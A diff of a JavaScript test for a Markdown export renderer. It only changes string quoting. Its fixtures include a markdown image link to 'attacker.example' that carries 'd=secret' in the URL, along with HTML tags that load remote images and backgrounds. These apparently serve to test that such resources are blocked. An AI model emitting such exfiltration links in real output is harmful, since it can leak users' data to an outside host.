@@ -9,7 +9,7 @@ describe("export Markdown renderer", () => {
       [
         "![x](https://attacker.example/p.png?d=secret)",
         '<img src=https://a.example/b><video poster="https://a.example/p" src="//a.example/v"></video><img srcset="https://a.example/1x 1x">',
-        "<table background=\"https://a.example/t\"><tr><td>cell</td></tr></table>",
+        '<table background="https://a.example/t"><tr><td>cell</td></tr></table>',
         "![ok](data:image/png;base64,AA)",
         "[a link](https://ok.example/doc)",
       ].join("\n\n"),
@@ -24,7 +24,7 @@ describe("export Markdown renderer", () => {
     const render = await loadExportMarkdownRenderer();
     const text = 'The input data = the output of step 2; set src = 0 and background="#fff".\n\n| a | b |\n|---|---|\n| raw data = 5 | x |';
     const html = render(text);
-    expect(html).toContain("The input data = the output of step 2; set src = 0 and background=\"#fff\".");
+    expect(html).toContain('The input data = the output of step 2; set src = 0 and background="#fff".');
     expect(html).toContain("<td>raw data = 5</td>");
   });
 
